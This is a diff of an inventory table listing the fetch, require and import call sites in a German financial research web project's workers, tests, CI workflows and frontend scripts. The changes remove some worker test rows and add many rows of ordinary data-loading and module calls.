-| workers/vu-account/tests/backtests.test.mjs | require(path.join(ROOT, 'scripts/quant/research/export-backtest-review-bundle.cjs')) |
-| workers/vu-account/tests/backtests.test.mjs | require(path.join(ROOT, 'scripts/quant/research/backtest-spec-builder.cjs')) |
-| workers/vu-account/tests/backtests.test.mjs | require(path.join(ROOT, 'scripts/quant/research/build-backtest-catalog.cjs')) |
-| workers/vu-account/tests/backtests.test.mjs | require(path.join(ROOT, 'scripts/quant/research/backtest-runner.cjs')) |
-| workers/vu-account/tests/backtests.test.mjs | require(path.join(ROOT, 'scripts/quant/portfolio/export-model-portfolios-bundle.cjs')) |
-| workers/vu-ask/src/gate.mjs | fetch(...a)) |
-| workers/vu-ask/src/gate.mjs | fetch(request) { |
-| workers/vu-ask/src/index.mjs | fetch(request, env) { |
-| workers/vu-ask/src/index.mjs | fetch("https://gate" + path, { |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://gate/ask", { |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request(u, init)) }) } } |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://ask.example/v1/ask", { method: "POST", headers: { origin: "https://evil.example" }, body: "{}" }), env) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://ask.example/v1/admin/report", { headers: { authorization: "Bearer falsch" } }), env) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://ask.example/v1/admin/report", { headers: { authorization: "Bearer admin-geheim" } }), env) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://ask.example/v1/ask", { method: "POST", headers: { origin: "https://research.visionuniverse.de" }, body: "x".repeat(9000) }), env) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://ask.example/v1/ask", { |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(req(), env)).status, 401) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(req("falsch"), env)).status, 401) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://ask.example/v1/quota?client=x", { headers: { "x-vu-access": "falsch" } }), env) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(req("VU-TEST-PASS-WORT"), env) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://ask.example/v1/ask", { method: "OPTIONS", headers: { origin: "https://research.visionuniverse.de" } }), env) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://ask.example/v1/quota?client=x", { headers: { "x-vu-access": "mein-passwort" } }), env) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://ask.example/v1/quota?client=x", { headers: { "x-vu-access": "admin-geheim" } }), env) |
-| workers/vu-ask/tests/vu-ask.test.mjs | fetch(new Request("https://gate/ask", { method: "POST", headers: { "x-vu-ip": "1.2.3.4" }, |
+| .github/workflows/company-intelligence-profile-source.yml | ` fetch('https://research.visionuniverse.de/company-intelligence-delivery.json?profile='+Date.now(),{signal:AbortSignal.timeout(15000)}) ` |
+| .github/workflows/company-intelligence-universe-release.yml | ` fetch(root+'company-intelligence-delivery.json'+query),d=await r.json() ` |
+| .github/workflows/company-intelligence-universe-release.yml | ` fetch(root+'company-intelligence-refresh.json'+query)).json() ` |
+| .github/workflows/elliott-prospective-registry.yml | ` require("./'"$REG"'/HEAD.json") ` |
+| .github/workflows/elliott-prospective-registry.yml | ` require("./'"$REG"'/HEAD.json") ` |
+| .github/workflows/europe-discover-refresh.yml | ` require(process.argv[1]).run&#124;&#124;{} ` |
+| .github/workflows/freshness-monitor.yml | ` require(process.env.RUNNER_TEMP + "/pipeline-freshness.json") ` |
+| .github/workflows/fundamental-sec-freshness.yml | ` require(process.argv[1]) ` |
+| .github/workflows/fundamental-sec-freshness.yml | ` require(process.argv[1]).oldestPending &#124;&#124; "")' "$RUNNER_TEMP/freshness.json") ` |
+| .github/workflows/fundamental-sec-freshness.yml | ` require(process.argv[1]) ` |
+| .github/workflows/fundamental-sec-freshness.yml | ` require(process.argv[1]) ` |
+| .github/workflows/long-series.yml | ` require(process.argv[1]).affected.length)' "$RUNNER_TEMP/verify.json") ` |
+| .github/workflows/long-series.yml | ` require(process.argv[1]).affected.map(a => a.ticker).join(","))' "$RUNNER_TEMP/verify.json") ` |
+| .github/workflows/long-series.yml | ` require(process.argv[1]).affected.map(a => a.securityId).join(" "))' "$RUNNER_TEMP/verify.json") ` |
+| .github/workflows/market-data-refresh.yml | ` require(process.env.RUNNER_TEMP + "/total-return-repair.json") ` |
+| .github/workflows/monitor.yml | ` require("./quant/data/market/commercial/" + name + ".json") ` |
+| .github/workflows/product-intelligence-materialization.yml | ` require(process.env.RUNNER_TEMP+"/freshness-vorher.json") ` |
+| .github/workflows/product-intelligence-materialization.yml | ` require(process.env.RUNNER_TEMP+"/freshness-vorher.json") ` |
+| .github/workflows/quant-portfolio-research.yml | ` require(process.argv[1]) ` |
+| .github/workflows/security-master-weekly.yml | ` require(process.env.REPORT) ` |
+| .github/workflows/social-cloudflare.yml | ` require(process.cwd() + "/tmp/social/status.json") ` |
+| .github/workflows/social-cloudflare.yml | ` require(process.cwd() + "/tmp/social/status.json") ` |
+| .github/workflows/social-smoke-publish.yml | ` require(process.cwd() + "/tmp/smoke/status.json") ` |
+| .github/workflows/social-smoke-publish.yml | ` require(process.cwd() + "/tmp/smoke/status.json") ` |
+| .github/workflows/social-smoke-publish.yml | ` require(process.cwd() + "/tmp/smoke/status.json") ` |
+| .github/workflows/supertrader-sf8-candidates.yml | ` require(process.env.REPORT) ` |
+| .github/workflows/supertrader-sf8-candidates.yml | ` require(process.env.PUB + "/summary.json").asOf)') ` |
+| .github/workflows/supertrader-sf8-candidates.yml | ` require(process.env.RECORD) ` |
+| .github/workflows/supertrader-sf8-candidates.yml | ` require(process.env.RECORD) ` |
+| .github/workflows/technical-intelligence-build.yml | ` require("./'"$V3"'/build-inputs.json").fingerprint&#124;&#124;"")}catch(e){console.log("")}') ` |
+| .github/workflows/technical-intelligence-build.yml | ` require("./'"$V3"'/meta.json") ` |
+| .github/workflows/technical-intelligence-build.yml | ` require("./'"$V3"'/meta.json") ` |
+| .github/workflows/tiingo-scale.yml | ` require("./quant/data/market/scale/gate-" + process.env.GATE + ".json") ` |
+| .github/workflows/tiingo-scale.yml | ` require("./quant/data/market/scale/gate-"+process.env.GATE+".json").verdict)}catch(e){console.log("MISSING")}') ` |
+| .github/workflows/tiingo-scale.yml | ` require("./quant/data/market/scale/gate-"+process.env.GATE+".json") ` |
+| academy/shell/experience-shell.js | ` fetch(url) ` |
+| analysten/index.html | ` fetch(UNIVERSE_URL + suffix, opts).then(function(r){ return r.ok ? r.json() : { stocks: [] } ` |
+| analysten/index.html | ` fetch(RATINGS_URL + suffix, opts).then(function(r){ if(!r.ok) throw new Error("HTTP " + r.status) ` |
+| analysten/index.html | ` fetch(MARKET_URL + suffix, opts).then(function(r){ return r.ok ? r.json() : { symbols: {} } ` |
+| analysten/index.html | ` fetch(url,{cache:"default"}).then(function(r){ if(!r.ok) throw new Error("HTTP "+r.status) ` |
+| api/intraday.js | ` fetch(origin + "/" + path.replace(/^\/+/, ""), { ` |
+| app/scripts/gesture-bridge-browser.mjs | ` require(modules ? modules+'/playwright' : 'playwright') ` |
+| app/scripts/gesture-browser.mjs | ` require(deps ? deps+'/playwright' : 'playwright') ` |
+| app/www/js/api.js | ` fetch(...a)}) { ` |
+| app/www/js/auth.js | ` fetch(...a), now = Date.now}) { ` |
+| ask/app.js | ` fetch(ENDPOINT + '/v1/quota?client=' + encodeURIComponent(clientId()), { headers: authHeaders() }) ` |
+| ask/app.js | ` fetch(ENDPOINT + '/v1/ask', { method: 'POST', headers: authHeaders({ 'content-type': 'application/json' }), ` |
+| ask/app.js | ` fetch(path, { cache: 'default' }).then(function (r) { if (!r.ok) throw Error('HTTP ' + r.status) ` |
+| assets/vu-ui.js | ` fetch(LOGO_BASE + "index.json", { cache: "default" }).then(function (r) { return r.ok ? r.json() : {} ` |
+| core/tests/client.test.mjs | ` require(join(ROOT, "core", "client.js")) ` |
+| core/tests/europe-discover-known-invalid.test.mjs | ` import(join(root,'scripts/marketstack/europe-discover-refresh.mjs')) ` |
+| core/tests/europe-discover-refresh.test.mjs | ` import(join(root,'scripts/marketstack/europe-discover-refresh.mjs')) ` |
+| core/tests/europe-discover-schedule.test.mjs | ` import(join(root,'scripts/marketstack/europe-discover-refresh.mjs')) ` |
+| core/tests/golden-paths.test.mjs | ` require(join(ROOT, "core", "client.js")) ` |
+| core/tests/golden-paths.test.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| core/tests/health.test.mjs | ` require(join(ROOT, "core", "health.js")) ` |
+| core/tests/health.test.mjs | ` require(join(ROOT, "quant", "engines", "realtime", "trading-session.js")) ` |
+| core/tests/identity-adoption.test.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| core/tests/identity-adoption.test.mjs | ` require(join(ROOT, "quant", "engines", "company-master.js")) ` |
+| core/tests/identity.test.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| core/tests/identity.test.mjs | ` require(join(ROOT, "quant", "engines", "company-master.js")) ` |
+| core/tests/portfolios.test.mjs | ` require(join(root, "assets/vu-ui.js")) ` |
+| core/tests/portfolios.test.mjs | ` require(join(root, "portfolios/portfolios.js")) ` |
+| core/tests/sf8-data-quality.test.mjs | ` require(join(ROOT, "core", "data-quality.js")) ` |
+| core/tests/sf8-data-quality.test.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| core/tests/sf8-data-quality.test.mjs | ` require(join(ROOT, "quant", "engines", "published-close.js")) ` |
+| core/tests/shell-navigation.test.mjs | ` require(join(root, 'fundamental/engine/model.js')) ` |
+| core/tests/shell-navigation.test.mjs | ` require(join(root, 'technical/engine/model.js')) ` |
+| core/tests/state-gate.test.mjs | ` import(GATE) ` |
+| core/tests/state/supertrader-discover.test.mjs | ` require(join(ROOT, "core", "client.js")) ` |
+| core/tests/stock-address.test.mjs | ` require(join(ROOT, "core", "stock-address.js")) ` |
+| core/tests/stock-address.test.mjs | ` require(join(ROOT, "core", "stock-context.js")) ` |
+| core/tests/stock-availability.test.mjs | ` require(join(ROOT, "core", "stock-context.js")) ` |
+| core/tests/stock-context.test.mjs | ` require(join(ROOT, "core", "stock-context.js")) ` |
+| core/tests/stock-context.test.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| core/tests/stock-navigator.test.mjs | ` require(join(ROOT, "core", "stock-context.js")) ` |
+| core/tests/stock-navigator.test.mjs | ` require(join(ROOT, "assets", "stock-navigator.js")) ` |
+| core/tests/supertrader-chain.test.mjs | ` import(CHAIN) ` |
+| core/tests/supertrader-chain.test.mjs | ` import(join(ROOT, "scripts", "ci", "pipeline-alarm.mjs")) ` |
+| core/tests/vu-chart.test.mjs | ` require(join(ROOT, "assets", "vu-chart.js")) ` |
+| core/tests/watchlist-button.test.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| core/tests/watchlist-button.test.mjs | ` require(join(ROOT, "assets", "watchlist-button.js")) ` |
+| dashboard/app-rebuild.js | ` fetch('/dashboard/' + path, { cache: 'no-store' }).then((r) => { if (!r.ok) throw new Error(path) ` |
+| dashboard/app.js | ` fetch(url).then(function(r){if(!r.ok)throw Error("Daten nicht verfügbar") ` |
+| dashboard/index_legacy_v63.html | ` fetch(url)})) ` |
+| dashboard/v2.js | ` fetch("/dashboard/"+(n==="universe"?"config/":"data/")+n+".json").then(r=>r.json()))).catch(()=>[]) ` |
+| discover/engines/europe-bootstrap.js | ` fetch(localURL(binding.url),{cache:'no-cache',credentials:'same-origin'}) ` |
+| discover/engines/europe-bootstrap.js | ` fetch(asset.path) ` |
+| discover/engines/europe-bootstrap.js | ` fetch(BASE+'manifest.json',{cache:'no-cache',credentials:'same-origin'}) ` |
+| discover/index.html | ` fetch() der Seite und wird genau diesem ` |
+| discover/tests/contract.test.mjs | ` require(join(root, "discover", "engines", "contract.js")) ` |
+| discover/tests/einordnung.test.mjs | ` require(join(root, "discover", "engines", "einordnung.js")) ` |
+| discover/tests/einordnung.test.mjs | ` require(join(root, "discover", "engines", "unternehmen.js")) ` |
+| discover/tests/europe-product.test.mjs | ` require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES+'/playwright') ` |
+| discover/tests/high52w.test.mjs | ` require(join(root, "discover", "engines", "high52w.js")) ` |
+| discover/tests/im-blick-live.test.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| discover/tests/im-blick-nachtlauf.test.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| discover/tests/im-blick-nachtlauf.test.mjs | ` require(join(ROOT, "discover", "engines", "refresh-plan.js")) ` |
+| discover/tests/im-blick-nachtlauf.test.mjs | ` import(join(ROOT, "scripts", "ci", "pipeline-alarm.mjs")) ` |
+| discover/tests/im-blick-refresh.test.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| discover/tests/im-blick-refresh.test.mjs | ` require(join(ROOT, "discover", "engines", "refresh-plan.js")) ` |
+| discover/tests/im-blick-refresh.test.mjs | ` fetch() {} }) ` |
+| discover/tests/im-blick-refresh.test.mjs | ` fetch() {} }) ` |
+| discover/tests/indicators.test.mjs | ` require(join(root, "discover", "engines", "indicators.js")) ` |
+| discover/tests/klartext.test.mjs | ` require(join(root, "discover", "engines", "klartext.js")) ` |
+| discover/tests/klartext.test.mjs | ` require(join(root, "discover", "engines", "contract.js")) ` |
+| discover/tests/lazy-loading.test.mjs | ` fetch() derselben Adresse bekommt die vorgeholte Antwort - genau einmal', async () => { ` |
+| discover/tests/price-rounding.test.mjs | ` require(join(root, "quant", "engines", "published-close.js")) ` |
+| discover/tests/pwa-shell.test.mjs | ` fetch({request: req, respondWith: x => { r = x ` |
+| discover/tests/realtime.test.mjs | ` require(join(root, "discover", "engines", "realtime-source.js")) ` |
+| discover/tests/realtime.test.mjs | ` require(join(root, "discover", "engines", "contract.js")) ` |
+| discover/tests/scoring.test.mjs | ` require(join(root, "discover", "engines", "scoring.js")) ` |
+| discover/tests/scoring.test.mjs | ` require(join(root, "discover", "methodology", "discover-v1.json")) ` |
+| discover/tests/technical-intelligence.test.mjs | ` require(join(root, "discover", "engines", "technical-intelligence.js")) ` |
+| discover/tests/technical-intelligence.test.mjs | ` require(join(root, "discover", "engines", "contract.js")) ` |
+| discover/tests/watchlist-coupling.test.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| discover/tests/watchlist-coupling.test.mjs | ` require(join(ROOT, "assets", "watchlist-button.js")) ` |
+| discover/ui/featured.js | ` fetch(url,{cache:'no-cache'}).then(function(r){if(!r.ok)throw new Error('HTTP '+r.status) ` |
+| discover/ui/lazy.js | ` fetch(src, { method: 'HEAD', cache: 'no-store', credentials: 'same-origin', signal: ctl ? ctl.signal : undefined }) ` |
+| discover/ui/logos.js | ` fetch(BASE + "index.json", { cache: "default", priority: "low" }) ` |
+| discover/ui/logos.js | ` fetch(BASE + "credits.json", { cache: "default" }) ` |
+| discover/ui/series-loader.js | ` fetch(path, { cache: "default" }).then(function (r) { ` |
+| docs/VU_MARKETS_3_CONSUMER_INTELLIGENCE.md | `` fetch(` und Providernamen in `market-intelligence.js`. `` |
+| docs/VU_QUANT_2_FRONTEND_TRANSFORMATION.md | `` fetch()` `` |
+| docs/VU_TWELVE_DATA_ADAPTER.md | ` fetch(url, init) ` |
+| docs/accounts/ACCOUNTS_AND_SUBSCRIPTIONS.md | ` fetch(credentials:"include", X-VU-Client: web) – hält KEIN Token ` |
+| docs/charts/CHART_STANDARD.md | ` fetch(path, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw 0 ` |
+| docs/design/VU3_UI_SYSTEM.md | ` fetch(…).then(…), base: previousClose } ` |
+| docs/design/redesign-2027/tools/series.js | ` require(path.resolve(__dirname, '../../../../core/identity.js')) ` |
+| docs/quant-recovery/v8/validation-f10-checkpoint.json | ` require(\"node:fs\"),path=require(\"node:path\") ` |
+| elliott/app.js | ` fetch(path, { credentials: "same-origin" }).then(function (res) { ` |
+| elliott/index.html | ` fetch(g.getAttribute("data-content"),{credentials:"same-origin"}).then(function(r){return r.text() ` |
+| elliott/spark.js | ` fetch("/quant/data/market/discover-series/" + id + ".json", { credentials: "same-origin" }) ` |
+| fundamental/app.js | ` fetch(path, { credentials: 'same-origin' }).then(function (r) { if (!r.ok) { var e = new Error('HTTP ' + r.status) ` |
+| fundamental/app.js | ` fetch(path, { credentials: 'same-origin' }).then(function (r) { ` |
+| guide/app.js | ` fetch('/dashboard/' + path, { cache: 'no-store' }).then((r) => { if (!r.ok) throw new Error(path) ` |
+| hedgefonds/app.js | ` fetch(url, { cache: "no-cache" }).then(function (r) { ` |
+| hedgefonds/app.js | ` fetch(url, { cache: "no-cache" }).then(function (r) { ` |
+| konto/watchlist.js | ` fetch(path, {cache: 'default', credentials: 'omit'}).then(function (r) { if (!r.ok) throw new Error('HTTP_' + r.status) ` |
+| landing/scripts/check-live.mjs | ` fetch(new URL('assets/home/home.css',url)) ` |
+| landing/scripts/cloudflare-audit.mjs | ` fetch('https://api.cloudflare.com/client/v4'+path,{headers:{Authorization:'Bearer '+token},signal:AbortSignal.timeout(20000)}) ` |
+| landing/scripts/cloudflare-prepare.mjs | ` fetch('https://api.cloudflare.com/client/v4'+path,{method,headers:{Authorization:'Bearer '+token},signal:AbortSignal.timeout(30000)}) ` |
+| landing/scripts/compare-research.mjs | ` import(pathToFileURL(resolve(temporary,'landing/scripts/build.mjs'))) ` |
+| landing/server/newsletter.mjs | ` fetch(request,env){ ` |
+| landing/server/newsletter.mjs | ` fetch(request) ` |
+| landing/tests/cloudflare.test.mjs | ` import(${JSON.stringify(pathToFileURL(resolve(root,'scripts/cloudflare-audit.mjs')).href)}) ` |
+| landing/tests/cloudflare.test.mjs | ` import(${JSON.stringify(pathToFileURL(resolve(root,'scripts/cloudflare-prepare.mjs')).href)}) ` |
+| landing/tests/edge-runtime.mjs | ` fetch(origin+'/ready')).status===200 ` |
+| landing/tests/edge-runtime.mjs | ` fetch(origin+'/legacy').then(r=>r.json()),{rejected:true}) ` |
+| landing/tests/edge-runtime.mjs | ` fetch(origin+'/api/newsletter/subscribe',{method:'POST',headers:{Origin:'https://www.visionuniverse.de','Content-Type':'application/json','CF-Connecting-IP':ip},body: ` |
+| landing/tests/edge-runtime.mjs | ` fetch(origin+'/stats').then(r=>r.json()),{attempted:2,accepted:1,unexpected:0,validBody:true}) ` |
+| landing/tests/edge-runtime/fixture.mjs | ` fetch(request){ ` |
+| landing/tests/edge-runtime/mock.mjs | ` fetch(request){ ` |
+| macro/app.js | ` fetch(path).then(function (r) { if (!r.ok) throw new Error(path + " " + r.status) ` |
+| mein-dashboard/dashboard.js | ` fetch(path, {cache: 'default', credentials: 'omit'}).then(function (r) { if (!r.ok) throw new Error('HTTP_' + r.status) ` |
+| news/news.js | ` fetch(path, { cache: 'no-store' }) ` |
+| portfolios/portfolios.js | ` fetch(path, { cache: "no-cache" }).then(function (r) { if (!r.ok) throw new Error(String(r.status)) ` |
+| portfolios/portfolios.js | ` fetch(path, { cache: "no-cache" }).then(function (r) { if (!r.ok &#124;&#124; typeof root.DecompressionStream !== "function") throw new Error("GZ") ` |
+| providers/sec/adapter.js | ` require(path.join(ENGINES, "capabilities.js")) ` |
+| providers/sec/adapter.js | ` require(path.join(ENGINES, "provider.js")) ` |
+| providers/sec/adapter.js | ` require(path.join(ENGINES, "schema.js")) ` |
+| providers/tiingo/adapter.js | ` require(path.join(engines, "provider.js")) ` |
+| providers/tiingo/adapter.js | ` require(path.join(engines, "schema.js")) ` |
+| providers/tiingo/adapter.js | ` require(path.join(engines, "capabilities.js")) ` |
+| providers/tiingo/adapter.js | ` require(path.join(engines, "market-client.js")) ` |
+| providers/twelve-data/adapter.js | ` require(path.join(ENGINES, "capabilities.js")) ` |
+| providers/twelve-data/adapter.js | ` require(path.join(ENGINES, "market-client.js")) ` |
+| providers/twelve-data/adapter.js | ` require(path.join(ENGINES, "provider.js")) ` |
+| providers/twelve-data/adapter.js | ` require(path.join(ENGINES, "schema.js")) ` |
+| quant/api/product-services.js | ` fetch(path,{credentials:'omit'}) ` |
+| quant/api/technical-intelligence-workspace.js | ` fetch(path, { credentials: "omit" }).then(function (res) { ` |
+| quant/app/view-model.js | ` require() - die Tests pruefen jede Aussage gegen echte ` |
+| quant/engines/fx/bootstrap.js | ` fetch(url, { credentials: "same-origin" }).then(function (res) { ` |
+| quant/engines/instrument-directory.js | ` fetch(path).then(function (res) { ` |
+| quant/engines/multi-asset/instrument-catalog.js | ` require(path.join(__dirname, "..", "..", "config", "multi-asset-instruments.json")) ` |
+| quant/engines/multi-asset/instrument-catalog.js | ` require(path.join(__dirname, "..", "..", "config", "multi-asset.json")) ` |
+| quant/engines/technical/technical-analysis.js | ` require(name) : global.VUTechnical[key] ` |
+| quant/engines/technical/technical-analysis.js | ` require(path) ` |
+| quant/engines/technical/ti/engine.js | ` require(path) : global.VUTechnical[key] ` |
+| quant/index.html | ` fetch(p,{cache:"no-cache"}) ` |
+| quant/musterdepots/depots.js | ` fetch(DATA, { cache: "no-cache" }).then(function (r) { if (!r.ok) throw new Error(r.status) ` |
+| quant/tests/analysis-lag.test.mjs | ` require() AUSGEFUEHRT statt als Quelltextausschnitt gelesen ` |
+| quant/tests/analysis-lag.test.mjs | ` require(join(root, "quant/api/product-services.js")) ` |
+| quant/tests/analysis-lag.test.mjs | ` require(join(root, "quant/engines/display-policy.js")) ` |
+| quant/tests/analysis-lag.test.mjs | ` require(join(root, "quant/engines/query.js")) ` |
+| quant/tests/analysis-lag.test.mjs | ` require(join(root, "quant/engines/realtime/freshness.js")) ` |
+| quant/tests/analysis-lag.test.mjs | ` require(join(root, "quant/config/market-calendar.json")) ` |
+| quant/tests/analysis-lag.test.mjs | ` require(join(root, "quant/app/view-model.js")) ` |
+| quant/tests/assignment-change.test.mjs | ` require() ausgefuehrt) und die Flaechen in quant/app/*.js. Sie schlagen ` |
+| quant/tests/assignment-change.test.mjs | ` require(join(root, "quant/engines/strategy-match.js")) ` |
+| quant/tests/assignment-change.test.mjs | ` require(join(root, "quant/engines/rule-contract.js")) ` |
+| quant/tests/assignment-change.test.mjs | ` require(join(root, "quant/api/alert-rule-contract.js")) ` |
+| quant/tests/assignment-change.test.mjs | ` require(join(root, "quant/engines/query.js")) ` |
+| quant/tests/assignment-change.test.mjs | ` require(join(root, "quant/api/product-services.js")) ` |
+| quant/tests/assignment-change.test.mjs | ` require(join(root, "quant/engines/display-policy.js")) ` |
+| quant/tests/assignment-change.test.mjs | ` require(join(root, "quant/engines/query.js")) ` |
+| quant/tests/assignment-change.test.mjs | ` require(join(root, "quant/app/view-model.js")) ` |
+| quant/tests/backtest-demo-freshness.test.mjs | ` require(SCRIPT) ` |
+| quant/tests/classify-rejections-cli.test.mjs | ` require(join(root, "quant", "engines", "market-store.js")) ` |
+| quant/tests/company-name-coverage.test.mjs | ` require(join(ROOT, "quant/engines/instrument-classification.js")) ` |
+| quant/tests/company-name-coverage.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/company-name-coverage.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/company-name-coverage.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/coverage-metrics.test.mjs | ` require(join(root, "quant", "engines", "coverage-metrics.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "fx-rates.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "fx-freshness.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "currency-registry.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "currency-class.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "currency-engine.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "money-format.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "currency-preference.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "currency-contract.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "fx-capability.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "fx-realtime-state.js")) ` |
+| quant/tests/currency-fx-matrix.test.mjs | ` require(join(FX, "fx-provider-registry.js")) ` |
+| quant/tests/daily-lifecycle-health.test.mjs | ` require(join(root, "quant", "engines", "daily-lifecycle-health.js")) ` |
+| quant/tests/debt-instrument-classification.test.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| quant/tests/debt-instrument-classification.test.mjs | ` require(join(root, "quant", "engines", "company-master.js")) ` |
+| quant/tests/delivery-watchdog.test.mjs | ` require(join(root, "quant", "engines", "realtime", "delivery-watchdog.js")) ` |
+| quant/tests/elliott-home.test.mjs | ` require(join(ROOT, "elliott/engine/home-model.js")) ` |
+| quant/tests/elliott-home.test.mjs | ` import(new URL("../../scripts/technical/elliott-home/home.mjs", import.meta.url)) ` |
+| quant/tests/elliott-home.test.mjs | ` fetch("/quant/index.html"') < html.indexOf('l.href="/quant/data/technical-intelligence/v3/elliott-home.json"'), "Stack-Vorladen nur im Deep-Link-Zweig") ` |
+| quant/tests/elliott-home.test.mjs | ` import(new URL("../../scripts/vu2/build-release.mjs", import.meta.url)) ` |
+| quant/tests/elliott-registry-product-view.test.mjs | ` import(join(ROOT, "scripts/technical/elliott-registry/register.mjs")) ` |
+| quant/tests/elliott-registry-product-view.test.mjs | ` import(join(ROOT, "scripts/technical/elliott-registry/product-view.mjs")) ` |
+| quant/tests/elliott-registry-product-view.test.mjs | ` import(join(ROOT, "scripts/technical/elliott-registry/verify.mjs")) ` |
+| quant/tests/elliott-registry-product-view.test.mjs | ` import(join(ROOT, "scripts/technical/elliott-registry/ledger.mjs")) ` |
+| quant/tests/elliott-registry-product-view.test.mjs | ` import(join(ROOT, "scripts/technical/lib/ti-data.mjs")) ` |
+| quant/tests/elliott-registry-product-view.test.mjs | ` import(join(ROOT, "scripts/technical/lib/ti-product.mjs")) ` |
+| quant/tests/elliott-registry-product-view.test.mjs | ` import(join(ROOT, "scripts/technical/build-technical-intelligence.mjs")) ` |
+| quant/tests/elliott-registry-product-view.test.mjs | ` import(join(ROOT, "scripts/technical/lib/ti-projection.mjs"))).PROJECTION_VERSION ` |
+| quant/tests/elliott-registry.test.mjs | ` import(join(ROOT, "scripts/technical/elliott-setups/setup-library.mjs")) ` |
+| quant/tests/elliott-registry.test.mjs | ` import(join(ROOT, "scripts/technical/elliott-registry/ledger.mjs")) ` |
+| quant/tests/elliott-registry.test.mjs | ` import(join(ROOT, "scripts/technical/elliott-registry/register.mjs")) ` |
+| quant/tests/elliott-registry.test.mjs | ` import(join(ROOT, "scripts/technical/elliott-registry/verify.mjs")) ` |
+| quant/tests/elliott-registry.test.mjs | ` import(join(ROOT, "scripts/technical/elliott-registry/evaluate-registry.mjs")) ` |
+| quant/tests/elliott-registry.test.mjs | ` import(join(ROOT, "scripts/technical/elliott-registry/product-view.mjs")) ` |
+| quant/tests/elliott-registry.test.mjs | ` import(join(ROOT, "scripts/technical/lib/ti-data.mjs")) ` |
+| quant/tests/elliott-registry.test.mjs | ` import(join(ROOT, "scripts/technical/hsab/lib/replay-core.mjs")) ` |
+| quant/tests/elliott-registry.test.mjs | ` require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) ` |
+| quant/tests/factor-product-projection.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/factor-product-projection.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| quant/tests/factor-product-projection.test.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/factor-product-projection.test.mjs | ` require(join(ROOT, "quant/engines/factor-product-projection.js")) ` |
+| quant/tests/factor-product-projection.test.mjs | ` require(join(ROOT, "quant/engines/company-master.js")) ` |
+| quant/tests/frontend-transformation.test.mjs | ` require(). Die Engine-Tests (2) ` |
+| quant/tests/frontend-transformation.test.mjs | ` require(join(ROOT, "quant/engines/historical-cases.js")) ` |
+| quant/tests/frontend-transformation.test.mjs | ` require(join(ROOT, "quant/engines/pattern-research.js")) ` |
+| quant/tests/frontend-transformation.test.mjs | ` require(join(ROOT, "quant/app/view-model.js")) ` |
+| quant/tests/frontend-transformation.test.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| quant/tests/frontend-transformation.test.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")), queryEngine: require(join(ROOT, "quant/engines/query.js")) ` |
+| quant/tests/frontend-transformation.test.mjs | ` require(join(ROOT, "quant/api/screener-workspace.js")) ` |
+| quant/tests/fx-bootstrap-preload.test.mjs | ` fetch(url) { calls.push(url) ` |
+| quant/tests/helpers/weekly-portfolio-fixtures.mjs | ` require(root + '/quant/engines/research-weekly-loader.cjs'), B = require(root + '/quant/engines/weekly-benchmark.cjs'), C = require(root + '/quant/engines/research-cont ` |
+| quant/tests/history-store.test.mjs | ` require(join(root, "quant", "engines", "bar-codec.js")) ` |
+| quant/tests/history-store.test.mjs | ` require(join(root, "quant", "engines", "history-store.js")) ` |
+| quant/tests/history-store.test.mjs | ` require(join(root, "quant", "engines", "zero-cost-guard.js")) ` |
+| quant/tests/history-store.test.mjs | ` import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) ` |
+| quant/tests/history-store.test.mjs | ` import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) ` |
